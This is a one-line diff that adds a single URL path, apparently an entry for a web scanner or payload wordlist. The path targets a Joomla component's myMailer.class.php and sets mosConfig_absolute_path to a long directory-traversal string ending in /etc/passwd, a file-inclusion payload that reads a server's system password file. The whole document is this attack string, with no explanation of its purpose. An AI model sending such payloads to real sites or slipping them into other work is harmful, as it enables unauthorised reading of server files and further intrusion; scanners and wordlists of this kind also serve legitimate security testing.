@@ -1,0 +1,1 @@
+/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd
